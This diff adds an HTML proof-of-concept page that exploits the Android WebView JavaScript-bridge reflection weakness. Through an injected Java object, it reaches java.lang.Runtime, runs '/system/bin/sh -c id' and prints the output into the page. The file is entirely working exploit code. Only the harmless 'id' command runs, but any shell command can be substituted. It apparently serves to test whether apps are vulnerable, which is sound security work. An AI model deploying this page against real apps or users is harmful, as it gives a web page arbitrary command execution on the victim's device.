@@ -1,0 +1,29 @@
+<html>
+<head>
+    <h1>test runtime exec id</h1>
+<script>
+    function getContents(inputStream) {
+        var contents = "";
+        var b = inputStream.read();
+        var i = 1;
+        while(b != -1) {
+            var bString = String.fromCharCode(b);
+            contents += bString;
+            b = inputStream.read();
+        }
+        return contents;
+    }
+    function execute(cmdArgs) {
+    //  go_back_js_interface_name is the registered java interface.
+    //  it is an object, but is not iterable with for (var i in interface) {...}.
+        return jjkjjk.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);
+    }
+    var p = execute(["/system/bin/sh", "-c", "id"]);
+    document.write( "<h3>id:</h3><br><br>" );
+    document.write(getContents(p.getInputStream()));
+</script>
+</head>
+<body>
+runtime exec id
+</body>
+</html>
